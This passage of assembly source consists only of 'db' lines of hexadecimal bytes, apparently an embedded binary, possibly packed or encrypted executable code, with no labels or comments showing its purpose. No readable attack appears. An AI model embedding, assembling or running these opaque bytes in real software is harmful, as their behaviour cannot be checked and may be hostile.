db 044h,00bh,00dh,0d5h,028h,065h,091h,084h,0cbh,0ddh,0c2h,021h,078h,08bh,0e4h
db 053h,04bh,0c8h,011h,003h,023h,039h,00bh,0d7h,074h,0e9h,0fah,0e0h,032h,05ch
db 033h,0ffh,0e1h,035h,081h,02ch,04ch,0ceh,075h,00dh,092h,09ch,0b8h,039h,06ah
db 020h,05fh,070h,001h,070h,047h,07ch,005h,0d1h,0e1h,047h,0ebh,0f7h,08bh,01bh
db 006h,0dfh,04ah,054h,08bh,00ah,02bh,0c5h,024h,0eeh,0d2h,0f1h,049h,0cdh,069h
db 000h,0feh,004h,04eh,083h,0feh,03fh,07eh,01eh,0b0h,035h,08eh,0f7h,00dh,001h
db 021h,038h,0c2h,061h,04ah,04ah,061h,083h,0ffh,0c7h,0c0h,030h,088h,02bh,0cfh
db 0cbh,088h,02fh,020h,07ch,038h,016h,060h,0deh,04ah,0ech,023h,05ch,088h,044h
db 089h,0ddh,07ch,014h,01ch,0feh,00fh,075h,038h,08ch,064h,020h,0a0h,0ech,021h
db 00bh,0ebh,04fh,0b4h,0f5h,01ch,035h,0d9h,0bch,025h,0d5h,0fbh,0a4h,0cbh,062h
db 019h,03ah,07bh,0b0h,055h,05ah,03ch,04ah,0b1h,09fh,042h,038h,0e8h,07ah,04fh
db 048h,04dh,024h,089h,079h,004h,083h,02ch,098h,05bh,008h,0ffh,024h,0fch,009h
db 094h,07fh,012h,0d2h,069h,07ch,0f1h,00bh,0f1h,094h,0d3h,089h,0e2h,014h,02eh
db 0a0h,089h,051h,03fh,0c9h,0bbh,08dh,008h,064h,060h,01ah,01eh,0c7h,006h,0feh
db 00bh,07dh,029h,0d1h,002h,06bh,094h,00bh,000h,088h,018h,0bch,021h,0aeh,0bfh
db 0ceh,0d3h,03eh,0d3h,052h,016h,0efh,009h,03bh,00fh,05dh,070h,037h,009h,07ch
db 0ebh,02fh,098h,0deh,0c0h,005h,00dh,08dh,04eh,0e0h,07bh,004h,0adh,0ddh,028h
db 0deh,0bch,050h,0c5h,032h,0d6h,009h,037h,000h,07dh,046h,0b5h,0f8h,074h,00bh
db 089h,00ah,089h,02ah,06fh,000h,0c3h,0fch,021h,02eh,028h,0aeh,075h,0f0h,003h
db 0d1h,001h,0fah,00dh,021h,069h,032h,0fch,00bh,0e1h,081h,046h,08dh,079h,088h
db 01dh,004h,03ch,03eh,075h,01ah,03bh,01dh,075h,00bh,027h,0b9h,04ch,012h,03bh
db 0dfh,089h,018h,063h,064h,018h,018h,0ddh,089h,008h,08dh,042h,004h,07ah,058h
db 018h,034h,00dh,0a4h,036h,019h,0ffh,094h,0ffh,08eh,0a2h,059h,0c1h,075h,030h
db 08dh,050h,041h,092h,091h,0fah,014h,035h,089h,0b0h,057h,064h,090h,021h,038h
db 088h,070h,03bh,0c7h,074h,00dh,099h,0cah,0dah,02ch,084h,0e7h,0fdh,0b8h,068h
db 0c4h,041h,0c5h,030h,0d7h,03ah,079h,021h,018h,03eh,08dh,034h,081h,008h,001h
db 0cch,0e7h,089h,046h,010h,074h,02ah,06ah,004h,0c1h,093h,02dh,01bh,07ah,0b6h
db 030h,02dh,015h,08ch,061h,0c9h,0e0h,026h,014h,07ch,0d2h,022h,017h,0c3h,004h
db 013h,0a5h,023h,0a8h,081h,0f0h,0ffh,06bh,0e2h,004h,014h,089h,07eh,004h,0ffh
db 005h,0bch,001h,05ah,004h,083h,08bh,0c6h,054h,0a3h,056h,08ah,033h,00fh,045h
db 0e0h,057h,07ch,04ah,003h,059h,041h,0cfh,014h,061h,015h,01ah,0eeh,029h,08fh
db 0e0h,043h,0c3h,069h,0c0h,081h,00fh,044h,0c1h,05ah,030h,0dah,0abh,026h,0ach
db 0c1h,0b6h,022h,02ch,040h,008h,0c0h,008h,04ah,084h,062h,0d3h,09bh,0fbh,0c1h
db 0e7h,071h,016h,0c2h,00dh,010h,027h,070h,014h,009h,0f4h,065h,072h,080h,041h
db 0a3h,049h,0cdh,000h,06ch,001h,0cfh,03eh,016h,08dh,097h,000h,070h,03bh,0fah
db 077h,03ch,08dh,090h,0a7h,071h,04fh,047h,048h,083h,0c6h,042h,07ah,010h,088h
db 0ech,00fh,08dh,088h,0fch,073h,085h,0d9h,083h,0c7h,040h,0fch,0f0h,0b4h,080h
db 072h,083h,0efh,0ffh,048h,004h,0c7h,080h,0e8h,038h,020h,0a2h,02eh,005h,012h
db 0ech,090h,010h,048h,0f0h,0c7h,018h,010h,0b4h,097h,04fh,00ch,005h,0f8h,0d8h
db 04dh,073h,091h,001h,05fh,089h,040h,016h,0d9h,050h,00ch,008h,0c2h,004h,0cfh
db 0e4h,064h,09eh,044h,029h,0a0h,071h,00ch,0bch,09eh,08ah,046h,043h,08ah,0c8h
db 040h,07dh,019h,096h,084h,0c0h,088h,04eh,043h,075h,003h,014h,03ch,09bh,00ah
db 009h,078h,004h,0bah,0eah,0f7h,0d2h,021h,061h,0b0h,0cdh,039h,0c0h,038h,0bch
db 00eh,090h,086h,0ffh,005h,066h,068h,0b0h,0beh,080h,093h,003h,003h,097h,0ebh
db 01dh,068h,020h,020h,064h,0c1h,020h,0e9h,00ch,04ch,0dah,088h,0f7h,08bh,02dh
db 078h,097h,073h,0f9h,063h,0e7h,0aah,0c4h,0d5h,0d5h,000h,029h,00eh,092h,09dh
db 001h,02dh,0d6h,0d3h,06ch,053h,057h,03ch,062h,046h,093h,0afh,0b8h,0c4h,013h
db 068h,09bh,03bh,0f0h,075h,01eh,063h,0c9h,02eh,07ah,080h,0a3h,01eh,076h,034h
db 0a7h,084h,01ch,0a3h,084h,021h,08bh,068h,032h,0ebh,015h,0a1h,064h,0e1h,059h
db 029h,089h,035h,013h,0fdh,0d8h,023h,08bh,087h,0bbh,0c7h,004h,09dh,08dh,08eh
db 098h,037h,0efh,042h,020h,014h,08dh,046h,018h,075h,065h,059h,0a0h,07eh,010h
db 000h,0bdh,011h,006h,0edh,0b9h,033h,0d2h,083h,0fdh,010h,00fh,09dh,0b7h,09ah
db 0cdh,000h,0c2h,04ah,023h,0d1h,04ah,045h,089h,010h,008h,0f4h,002h,061h,081h
db 0fdh,000h,07ch,0e3h,060h,042h,093h,09ah,057h,00ah,060h,03dh,074h,003h,0c3h
db 03bh,0f8h,073h,01bh,080h,08fh,0c6h,03fh,09bh,08eh,047h,023h,0b3h,000h,07dh
db 007h,0c7h,047h,004h,0f0h,081h,0c7h,06fh,011h,021h,07ah,0ebh,0dch,0deh,0b7h
db 063h,00ch,027h,0ebh,0c6h,0c3h,0dfh,0fch,081h,0feh,0e8h,07bh,013h,046h,074h
db 00fh,0a8h,00dh,08bh,03eh,075h,0f8h,046h,031h,007h,096h,02fh,039h,035h,0a0h
db 0a6h,064h,009h,06ch,080h,0a3h,03eh,0cbh,012h,096h,020h,0e5h,0b1h,044h,0c3h
db 089h,0d3h,077h,025h,0b2h,006h,0c4h,074h,0b4h,0a4h,034h,068h,008h,067h,00dh
db 0c8h,043h,033h,0b5h,0b0h,023h,056h,08ch,057h,083h,03eh,090h,0edh,045h,0ffh
db 039h,0cbh,0afh,098h,0beh,010h,0f2h,00dh,06bh,0c2h,0f0h,03fh,03fh,05ah,08ch
db 033h,086h,075h,039h,03eh,0e3h,08dh,0cch,003h,013h,032h,0b1h,059h,050h,005h
db 0d0h,012h,0d8h,01fh,083h,00fh,00dh,050h,0cch,034h,026h,026h,065h,004h,0fbh
db 08ch,075h,0c5h,003h,01eh,0a4h,03bh,014h,00ch,0ffh,06ah,0e8h,05dh,040h,074h
db 00dh,081h,0ebh,083h,0efh,07bh,0c5h,030h,00ch,07dh,0b2h,0d8h,085h,060h,01eh
db 0ceh,08bh,0a7h,07ch,013h,001h,074h,02ch,083h,079h,018h,0ffh,010h,03ch,01ah
db 028h,08dh,041h,020h,05ah,00ch,042h,058h,076h,014h,0adh,0fah,0efh,091h,002h
db 08fh,0f9h,0d2h,04dh,0c6h,075h,03fh,05fh,06bh,025h,031h,072h,074h,00ah,0aeh
db 010h,0fbh,044h,00fh,08fh,0ffh,09bh,0eah,091h,0a5h,0bah,008h,0c4h,002h,014h
db 0cah,03bh,041h,010h,076h,005h,014h,072h,086h,064h,010h,0f6h,009h,074h,037h
db 068h,043h,061h,04eh,0a8h,0b3h,040h,058h,04bh,031h,0bah,015h,044h,007h,0a1h
db 081h,0e6h,0ffh,03bh,0f2h,072h,020h,044h,060h,043h,093h,00eh,00dh,055h,028h
db 01ch,0c8h,066h,019h,0c0h,059h,070h,0f0h,02bh,0c1h,02bh,0c2h,05eh,0c1h,0f8h
db 004h,0c8h,021h,006h,061h,008h,008h,098h,048h,0b3h,026h,05eh,02dh,092h,0a5h
db 010h,02bh,048h,010h,00ch,005h,06dh,0b3h,060h,0c8h,018h,08ch,065h,002h,0cah
db 011h,001h,010h,080h,021h,038h,005h,034h,04ch,0d0h,004h,0d9h,026h,092h,035h
db 092h,0beh,059h,027h,012h,015h,0a7h,09ch,020h,028h,0deh,028h,047h,010h,0b5h
db 09bh,04ch,00fh,044h,059h,09eh,0b4h,072h,005h,067h,0eah,0a7h,0c2h,056h,048h
db 097h,0f0h,000h,09fh,08bh,07eh,008h,018h,0c1h,04ch,069h,070h,020h,08bh,0c7h
db 02bh,018h,020h,05fh,085h,03eh,003h,00ch,003h,0c2h,046h,083h,0f9h,034h,03bh
db 0f9h,073h,03ah,08bh,00fh,078h,040h,000h,0bch,03bh,0cbh,07ch,01ah,039h,05fh
db 004h,076h,015h,053h,033h,06ah,0a1h,021h,043h,01bh,075h,004h,0ebh,04ah,043h
db 083h,0c7h,09bh,03eh,0eah,0c1h,0fch,04ch,0c4h,0eeh,072h,0c8h,06fh,035h,040h
db 058h,046h,04eh,010h,08dh,07eh,018h,032h,021h,0c4h,012h,098h,098h,009h,0c0h
db 073h,033h,08bh,007h,03bh,0c3h,07ch,019h,070h,016h,08ah,0b9h,0fch,05ch,026h
db 0cfh,099h,026h,081h,06bh,0dfh,0cah,0beh,009h,0c5h,064h,048h,03bh,072h,0d2h
db 063h,0f6h,086h,08bh,036h,03bh,074h,015h,08ch,059h,0a8h,02dh,041h,021h,089h
db 029h,08ah,0cfh,0c1h,037h,01fh,089h,043h,016h,0f7h,012h,05bh,03ah,062h,0d1h
db 00fh,01ah,07fh,006h,09dh,0a8h,017h,086h,00ch,000h,03fh,0c0h,0a6h,049h,0a4h
db 0ebh,0e8h,08bh,05fh,00ch,0f2h,014h,01ah,096h,08bh,0f3h,01ch,0c7h,037h,002h
db 02bh,0f7h,083h,0eeh,0feh,0e6h,0c2h,09fh,008h,066h,077h,03bh,011h,07ah,052h
db 031h,098h,010h,07dh,098h,03ch,006h,0dah,038h,0b8h,0aah,034h,002h,0efh,037h
db 0dch,00dh,024h,0e0h,050h,056h,081h,0a3h,083h,0c5h,0c6h,00fh,085h,0b8h,000h
db 00ch,014h,093h,007h,075h,0f8h,027h,0f0h,04ah,0b4h,04bh,012h,0e3h,032h,0c2h
db 0d2h,07eh,0dch,07bh,014h,079h,0cbh,0c8h,051h,0e0h,080h,088h,0f4h,050h,04ah
db 0d8h,010h,030h,050h,0fch,0bah,0c6h,00dh,0e1h,036h,011h,0c7h,041h,027h,020h
db 0d6h,08dh,083h,0c1h,092h,088h,011h,0d4h,075h,0d6h,089h,03dh,083h,0ech,011h
db 074h,03bh,0c8h,073h,02dh,0f6h,009h,071h,039h,005h,04ch,041h,0b3h,0c8h,0ebh
db 0f2h,01bh,0c0h,023h,04ch,072h,081h,051h,047h,088h,009h,04ch,023h,0ffh,008h
db 029h,003h,029h,00ch,071h,021h,0bah,08dh,008h,0c0h,0b1h,029h,0abh,010h,01eh
db 017h,019h,0ebh,034h,074h,029h,002h,06ch,001h,09bh,088h,059h,054h,019h,008h
db 00bh,0bbh,056h,08fh,0b6h,05bh,08ah,0d5h,02bh,0d3h,034h,02fh,040h,038h,0d3h
db 029h,050h,018h,08dh,081h,023h,0dah,0bfh,0cah,024h,07dh,0a4h,0d1h,08ah,0cch
db 014h,0fah,010h,071h,004h,084h,02dh,082h,064h,039h,08dh,099h,0e2h,011h,061h
db 096h,0e1h,0d0h,004h,063h,00eh,0c1h,03fh,099h,021h,017h,088h,017h,006h,018h
db 013h,050h,073h,007h,001h,011h,029h,0ebh,009h,083h,061h,004h,045h,024h,01bh
db 0e9h,041h,001h,003h,08ch,067h,0f9h,044h,02eh,003h,0f7h,080h,03eh,000h,09ch
db 00ah,067h,008h,0c6h,004h,0fah,050h,000h,010h,03bh,0f3h,073h,018h,084h,0dbh
db 0b8h,00fh,032h,02fh,058h,001h,064h,040h,018h,04ah,05eh,075h,004h,043h,046h
db 056h,010h,02dh,0c9h,073h,04eh,03bh,005h,0b9h,057h,061h,006h,06ah,008h,0d0h
db 0ebh,00ch,029h,039h,055h,029h,05eh,002h,0bdh,082h,099h,084h,06fh,0c3h,074h
db 0c3h,0ebh,005h,0f3h,003h,006h,0f3h,064h,0c1h,075h,0bdh,08dh,071h,085h,03eh
db 001h,03ch,0f7h,073h,07eh,016h,0d5h,0a1h,00ch,0e6h,008h,073h,076h,007h,01dh
db 046h,013h,075h,040h,05eh,001h,058h,025h,043h,040h,0fbh,088h,0ach,00bh,08dh
db 01ch,0a1h,026h,0d6h,00dh,009h,02bh,019h,063h,070h,014h,036h,071h,031h,088h
db 010h,004h,098h,053h,006h,0ebh,0c2h,073h,013h,029h,045h,0e1h,01dh,043h,0e8h
db 072h,034h,0ebh,0aeh,0e3h,05eh,040h,038h,0c0h,003h,0f0h,0ebh,0a7h,016h,0d1h
db 0d0h,0c8h,0e3h,0c2h,041h,088h,010h,0ceh,09ch,053h,06bh,0c9h,098h,0c0h,0bch
db 063h,00fh,0a4h,0adh,071h,004h,015h,0ech,0d0h,036h,054h,0cch,042h,068h,03ch
db 075h,062h,020h,023h,076h,080h,0c2h,019h,0aeh,072h,067h,070h,068h,030h,0d3h
db 081h,09ah,0d6h,057h,007h,054h,094h,02eh,0a3h,074h,0c7h,0c2h,0d0h,0e1h,068h
db 00ch,080h,0b9h,0d4h,042h,0a3h,058h,0a3h,05ch,0cch,0ebh,04ah,0cbh,0e2h,0a1h
db 016h,00ch,027h,086h,016h,0ffh,0d0h,074h,00eh,0a1h,05ch,061h,08ah,016h,086h
db 005h,053h,0a7h,086h,085h,03ch,018h,0c4h,0d4h,04ch,040h,015h,00fh,080h,098h
db 0bfh,0ebh,0f8h,085h,03ch,028h,0f6h,00ch,057h,07ah,0b9h,008h,062h,000h,0d9h
db 04dh,0ech,0c4h,0e0h,014h,0f7h,0c6h,003h,08ch,0b3h,04ch,03ch,0d8h,019h,0d8h
db 0a6h,075h,06fh,0ebh,021h,053h,038h,04ch,029h,046h,074h,025h,084h,088h,0e1h
db 0efh,042h,075h,0ebh,079h,020h,0a0h,077h,075h,051h,083h,0e3h,003h,0cch,0eeh
db 00ch,09eh,02fh,05fh,06ah,0c2h,021h,009h,071h,000h,096h,0c3h,0d2h,017h,04bh
db 016h,074h,012h,0d1h,03dh,0d6h,041h,08ah,0b1h,0c5h,0fah,0c2h,075h,0eeh,06ch
db 06ah,0d4h,085h,07bh,0fah,0f7h,000h,01ah,0b6h,01fh,060h,08ch,04bh,0afh,0cfh
db 00fh,0eah,04ch,006h,016h,083h,0c6h,0deh,05fh,0f8h,0fch,03ch,02ch,01eh,00ch
db 075h,0c6h,0e5h,007h,062h,020h,0ebh,018h,081h,0e2h,042h,076h,09eh,0c9h,00eh
db 000h,004h,0ddh,036h,02dh,0c3h,043h,02ch,0aah,005h,00ah,0a6h,06fh,0a9h,026h
db 08dh,0f0h,044h,01bh,075h,085h,034h,048h,0a1h,0c6h,06ah,002h,0b0h,031h,080h
db 0dah,050h,075h,07eh,086h,0cfh,0efh,018h,0a1h,080h,0e8h,04bh,0f8h,055h,005h
db 0f8h,0a1h,006h,075h,03eh,08dh,045h,0e4h,05eh,056h,068h,04ch,0a2h,09ah,060h
db 0e7h,078h,075h,021h,0eeh,026h,004h,003h,03bh,06dh,0cbh,01dh,048h,001h,049h
db 078h,0a6h,07ch,090h,059h,08dh,0c3h,0ceh,002h,058h,0a3h,071h,080h,069h,098h
db 0c9h,0c4h,03fh,0cah,024h,01ch,0d8h,0aeh,08bh,088h,005h,0a1h,0a3h,012h,0c2h
db 0c2h,014h,010h,0cfh,0bdh,090h,066h,012h,093h,041h,09eh,047h,009h,0e6h,064h
db 0eah,046h,047h,09ah,06ch,041h,039h,05dh,018h,04ch,0e2h,069h,08ah,082h,065h
db 076h,0d1h,053h,020h,0d6h,04dh,021h,020h,008h,040h,09dh,00bh,04dh,075h,018h
db 005h,06bh,0e2h,0bbh,0e0h,074h,063h,03ch,014h,0eeh,009h,08dh,03ch,00ch,006h
db 07ch,0e9h,003h,024h,001h,002h,023h,044h,035h,09bh,08bh,0f4h,089h,075h,0dch
db 057h,053h,01ch,062h,0f6h,096h,096h,0dbh,024h,013h,00bh,08bh,066h,035h,014h
db 0c1h,083h,02dh,02ah,0f2h,094h,06fh,042h,032h,081h,029h,0e0h,056h,056h,0b5h
db 070h,0e7h,05bh,08ch,0aeh,0b4h,014h,050h,059h,073h,03bh,032h,008h,0c4h,01eh
db 02ah,0c8h,08dh,065h,0cch,00fh,090h,00eh,073h,00dh,0a8h,04dh,098h,045h,00ch
db 008h,057h,012h,024h,00fh,062h,03bh,00fh,083h,0c5h,0a0h,08fh,0d4h,01ch,0e6h
db 01fh,020h,0f1h,00ah,0e3h,005h,06ah,006h,025h,0eeh,0a3h,04ch,00dh,04ah,020h
db 0cdh,040h,088h,08ah,007h,070h,064h,098h,09eh,001h,008h,035h,099h,032h,08bh
db 07ah,020h,0c7h,010h,075h,096h,061h,018h,0cfh,020h,016h,0e7h,0c8h,062h,048h
db 040h,014h,007h,001h,074h,01dh,08ah,040h,005h,03ch,00ah,04dh,010h,006h,084h
db 0e5h,01bh,04fh,001h,0c7h,045h,078h,005h,0ach,047h,000h,0c6h,044h,030h,005h
db 00ah,0ebh,0ech,04bh,009h,0f4h,0beh,00dh,0d6h,013h,051h,0ffh,034h,030h,064h
db 059h,03bh,021h,070h,03ah,031h,04fh,00dh,08fh,074h,06ah,005h,059h,015h,0e9h
db 065h,0f5h,054h,009h,0d9h,064h,0f1h,04eh,0f4h,07dh,080h,03ch,0c1h,049h,06dh
db 090h,036h,008h,0e3h,049h,050h,05ah,014h,066h,0edh,05ah,059h,0d6h,060h,0a0h
db 04dh,001h,055h,0f8h,0e0h,006h,0e3h,004h,030h,004h,08ah,004h,0a8h,080h,048h
db 045h,0c7h,02ah,085h,083h,0b0h,08ah,0e5h,03fh,00ah,00ch,004h,0e2h,00ah,001h
db 030h,024h,0fbh,088h,07ah,0a6h,05ch,014h,00ch,05bh,019h,072h,002h,010h,003h
db 0c8h,073h,00fh,0eeh,0e6h,0cbh,000h,029h,086h,078h,0cdh,03ch,01ah,064h,007h
db 0c1h,0d4h,03ch,00dh,074h,00bh,0ffh,032h,088h,058h,0a1h,048h,0cfh,049h,0c2h
db 070h,0c1h,059h,073h,018h,040h,080h,038h,04eh,034h,011h,064h,044h,062h,002h
db 040h,002h,0ebh,05eh,0c6h,007h,00dh,047h,0ebh,073h,0e4h,0aeh,0e7h,065h,0b5h
db 0a9h,027h,019h,0e7h,0a3h,0a1h,02dh,00ah,02ch,03fh,041h,026h,047h,0e5h,036h
db 0ech,00bh,003h,0f6h,091h,076h,0e1h,01bh,013h,08ah,000h,034h,026h,0bfh,017h
db 08bh,00bh,047h,088h,044h,031h,005h,0ebh,029h,0c6h,009h,038h,056h,03bh,075h
db 00bh,080h,07dh,0ffh,019h,087h,061h,02dh,005h,00ah,035h,0e2h,09ah,066h,0f7h
db 031h,0d6h,04fh,04fh,0c0h,0e5h,05dh,052h,076h,09ah,0feh,093h,0eeh,005h,0b1h
db 00fh,054h,047h,091h,0ddh,0cah,06eh,010h,074h,082h,0e4h,008h,0e7h,006h,0a8h
db 040h,002h,088h,006h,02bh,08ah,03eh,014h,063h,0f7h,00ch,0c2h,017h,014h,083h
db 025h,00ah,039h,064h,045h,000h,0c9h,0d6h,070h,062h,0ffh,005h,090h,043h,0d5h
db 0c6h,089h,092h,056h,018h,089h,059h,037h,04dh,0b3h,020h,0c0h,09ch,00ah,06ch
db 005h,083h,008h,0cch,042h,0dbh,022h,018h,0ebh,011h,0b1h,045h,036h,098h,004h
db 014h,027h,074h,0a6h,074h,002h,090h,0dah,081h,024h,0b9h,030h,08ah,03ah,060h
db 047h,029h,01fh,0f5h,01ch,045h,0b8h,04eh,0d8h,03dh,084h,075h,046h,057h,0fdh
db 0a3h,0f0h,04eh,05bh,053h,0efh,024h,04eh,0a8h,06ah,03bh,0b8h,011h,068h,0a1h
db 071h,0a1h,08ch,01dh,0ebh,022h,0e3h,0f8h,098h,0c4h,053h,057h,06ch,009h,0b6h
db 0ebh,0f2h,022h,001h,0fdh,04bh,0dfh,039h,07dh,014h,07eh,010h,098h,04fh,0eeh
db 047h,04bh,079h,049h,0c0h,0ach,050h,059h,014h,0a1h,084h,061h,058h,0cbh,0c7h
db 01dh,01ch,0a5h,0bbh,051h,085h,089h,0c8h,090h,091h,04ah,0e5h,0ebh,0d0h,019h
db 037h,0d3h,07dh,020h,0c8h,0eeh,099h,027h,020h,03ch,06eh,012h,0f1h,024h,020h
db 021h,0bbh,094h,0f9h,0e4h,03bh,0dfh,009h,0dah,0b0h,0a2h,078h,070h,012h,087h
db 004h,01bh,0c4h,084h,04ch,022h,098h,0dch,073h,051h,0d9h,024h,0ebh,013h,0ffh
db 005h,05fh,016h,01dh,08bh,0e4h,03eh,00dh,0ceh,0dch,074h,066h,0dch,06bh,009h
db 0cfh,0e1h,0f8h,024h,0bdh,0adh,04dh,072h,039h,059h,03bh,0b8h,0d3h,090h,032h
db 08bh,0f0h,02fh,000h,0f6h,042h,0d8h,074h,032h,0f6h,045h,00dh,004h,074h,040h
db 0ach,004h,03eh,0e1h,01ch,0b2h,06dh,084h,06ah,0cbh,07fh,01eh,038h,052h,0c9h
db 067h,0d8h,032h,022h,063h,085h,08fh,065h,0c8h,03ch,0ech,06fh,0d3h,03fh,0e6h
db 049h,087h,0fch,036h,0cdh,01bh,0d3h,088h,0dch,0e0h,0c9h,0b3h,068h,09dh,012h
db 013h,0ech,0d7h,0e4h,0dfh,074h,0b4h,056h,063h,075h,04eh,092h,0e4h,074h,09ch
db 0a7h,0cch,0d3h,067h,099h,00dh,0c3h,021h,0ebh,006h,029h,0a7h,082h,09eh,06ah
db 053h,0b4h,0aah,08eh,0d2h,0feh,0cdh,0d4h,04fh,06bh,0adh,019h,071h,011h,05ah
db 03ch,0e3h,0d5h,09dh,0d8h,070h,06ch,04bh,0a0h,018h,056h,08dh,04ah,0ffh,0b7h
db 0e2h,09fh,0c8h,074h,00bh,061h,042h,081h,08bh,0f1h,049h,0f3h,02dh,0d4h,041h
db 032h,05eh,02bh,08bh,081h,061h,0eah,0c2h,0c3h,0a1h,08ch,02ch,017h,035h,013h
db 004h,09bh,050h,08eh,0c5h,0abh,024h,06fh,093h,004h,08ah,07bh,0b2h,005h,03dh
db 088h,063h,0c8h,01eh,000h,053h,000h,0c1h,06dh,0aah,0f8h,061h,00fh,08ch,074h
db 000h,0b9h,0d4h,07ah,00fh,08fh,0a6h,0f4h,0d6h,080h,0dbh,09fh,035h,008h,05dh
db 005h,043h,0ddh,012h,008h,081h,0fbh,07dh,028h,08eh,0eeh,0ach,07ah,002h,002h
db 0d8h,003h,0a2h,06ch,04ah,072h,09ah,016h,06bh,08bh,015h,0e4h,001h,00ch,0bbh
db 0f1h,000h,0e6h,038h,0c8h,04ah,040h,001h,0bah,09ch,00ah,088h,05dh,009h,096h
db 066h,059h,03ch,009h,051h,03ch,080h,0c9h,0fch,065h,021h,0d1h,0d9h,003h,008h
db 02ch,028h,0dah,0f4h,025h,085h,011h,0b5h,020h,0a9h,059h,0ceh,069h,0d1h,08bh
db 005h,07fh,086h,0ebh,00dh,044h,0eah,033h,02ch,0fdh,09dh,086h,0c0h,00ch,00bh
db 0c1h,0c7h,0efh,067h,0a2h,0d8h,05dh,00fh,01fh,03bh,07ch,0f0h,05ch,0e8h,05dh
db 06ch,05dh,0fah,075h,038h,01ch,000h,05dh,02ch,05dh,050h,05dh,0f5h,04ch,034h
db 0dch,099h,068h,0cah,07bh,058h,0feh,0dfh,0efh,0cfh,079h,09eh,0c3h,0d2h,0bch
db 0b4h,0ach,0a4h,044h,07bh,09eh,0e7h,09ch,094h,08ch,0c9h,068h,057h,0cfh,0c3h
db 022h,078h,064h,0ffh,0f0h,0fdh,04ch,022h,09eh,0fch,010h,05eh,0d6h,0c7h,03ah
db 05eh,070h,05fh,020h,05fh,0b2h,010h,07bh,03bh,078h,05eh,090h,088h,0a2h,03dh
db 087h,0e5h,0a8h,0d0h,04dh,07ah,0eah,067h,0f4h,07eh,03dh,013h,0fdh,07bh,026h
db 09ah,096h,0c6h,0f2h,06dh,024h,02ch,03ch,0cfh,0f3h,01ch,034h,03ch,044h,04ch
db 054h,07ah,026h,0dah,0f3h,067h,02ch,0feh,046h,0bbh,080h,03dh,0cfh,061h,059h
db 088h,098h,0ach,0a4h,0abh,067h,0a2h,04ch,061h,048h,058h,053h,03bh,008h,0b2h
db 0d1h,014h,073h,073h,08bh,086h,001h,006h,01dh,041h,001h,038h,028h,005h,08dh
db 03ch,08dh,004h,072h,060h,0a7h,08bh,00fh,035h,020h,020h,09fh,031h,004h,001h
db 074h,056h,06ch,039h,008h,022h,051h,0f4h,00eh,09fh,00ah,039h,049h,0d4h,059h
db 010h,0ebh,04fh,0f1h,08eh,08ch,0aeh,01ch,054h,003h,041h,01bh,0e9h,083h,0fbh
db 099h,01bh,09ah,079h,074h,0d2h,0c0h,0cch,047h,009h,084h,06ah,029h,0c0h,0ebh
db 020h,08bh,007h,080h,064h,0fdh,08dh,0a3h,04dh,0d3h,0aeh,091h,0b6h,04eh,016h
db 0fbh,006h,085h,0e4h,033h,0d2h,04bh,001h,00fh,010h,0b8h,0b0h,03bh,081h,07dh
db 069h,004h,020h,042h,03dh,018h,0a8h,0d1h,0eah,030h,048h,0ebh,00bh,088h,005h
db 013h,072h,01dh,024h,077h,018h,0eah,002h,0fah,01eh,00dh,004h,0d5h,0b4h,0a7h
db 005h,082h,096h,0a3h,0c3h,081h,0f9h,0bch,097h,0f7h,038h,016h,072h,012h,0cah
db 07ah,0bch,02ch,01eh,008h,076h,00ah,016h,06eh,070h,0e0h,006h,0a0h,0dch,056h
db 06ah,014h,065h,088h,007h,022h,007h,0b8h,081h,030h,094h,0e8h,03bh,0c6h,07dh
db 029h,05bh,048h,007h,0c6h,0a3h,00ah,0ach,01fh,021h,052h,031h,059h,0a3h,094h
db 085h,0beh,08dh,018h,021h,03bh,06dh,00bh,0a4h,056h,089h,035h,020h,088h,055h
db 01fh,01ah,071h,054h,09ah,0b0h,0fdh,02ah,089h,093h,0a1h,037h,028h,03bh,089h
db 004h,011h,01ch,095h,0c1h,03dh,0c1h,004h,03dh,06eh,041h,01ah,091h,07ch,0eah
db 0b9h,028h,033h,09ah,08ah,020h,0c2h,08bh,0f2h,0e6h,0b3h,015h,0c6h,0a9h,0f0h
db 0a7h,0e2h,003h,028h,074h,0bdh,001h,05eh,060h,009h,0ffh,020h,042h,0d7h,004h
db 0d3h,0c5h,088h,07ch,0d4h,05eh,0c3h,0d2h,073h,0a5h,082h,053h,0d1h,080h,03dh
db 0ffh,048h,0a6h,081h,00fh,061h,0dfh,08ch,052h,0e2h,056h,03bh,00dh,003h,081h
db 0afh,094h,055h,0afh,0fch,04ch,0bah,0f1h,0c0h,060h,0d4h,081h,085h,007h,047h
db 0c8h,07ch,008h,0f6h,040h,037h,03ch,09eh,0a0h,074h,032h,01fh,078h,086h,079h
db 086h,074h,081h,006h,077h,022h,010h,049h,049h,075h,007h,0c4h,082h,067h,0f4h
db 0ebh,008h,0f5h,0ebh,003h,0fbh,01eh,0f0h,010h,0f6h,050h,0b5h,015h,072h,001h
db 083h,00ch,030h,0ffh,0c7h,036h,08fh,0a9h,038h,0a6h,018h,096h,073h,01ch,0e0h
db 0dch,029h,0c6h,053h,01fh,08bh,00ch,097h,01ch,0e9h,0d8h,0c1h,036h,0c3h,04fh
db 0e0h,0c1h,074h,00eh,0a5h,0f3h,08fh,0a1h,0d1h,094h,054h,07bh,012h,053h,04dh
db 057h,014h,0cah,082h,0e0h,057h,089h,077h,04eh,0bch,0d0h,0aeh,095h,00fh,050h
db 0bch,077h,058h,0d2h,0aeh,0e9h,01ah,01ah,0b0h,043h,0ddh,04ah,02eh,050h,08bh
db 0f8h,059h,00eh,068h,078h,04bh,085h,04ch,056h,012h,06fh,0c9h,002h,072h,012h
db 03fh,066h,012h,07eh,0eeh,054h,063h,00ch,01eh,03fh,05ah,034h,0bah,054h,008h
db 0f8h,0abh,048h,031h,093h,024h,0cah,050h,0cch,0d6h,01bh,056h,0dbh,035h,0b8h
db 0b3h,074h,019h,0ebh,08bh,047h,05eh,0b2h,068h,0c7h,098h,0c4h,00ch,028h,05dh
db 0c3h,056h,0ebh,0ech,0f5h,089h,034h,019h,06bh,061h,0f2h,018h,0a6h,05eh,039h
db 07eh,044h,0a1h,0c1h,0aeh,044h,08dh,0b0h,0c3h,0adh,094h,006h,02fh,049h,0beh
db 098h,061h,0c8h,01ah,086h,0a8h,054h,047h,074h,06ch,05ch,0c0h,058h,001h,0feh
db 014h,07ch,017h,0ffh,073h,092h,017h,029h,034h,0b0h,062h,0c3h,004h,018h,059h
db 083h,024h,0b0h,000h,046h,03bh,07ch,0bch,069h,08bh,0a6h,06fh,039h,012h,0cdh
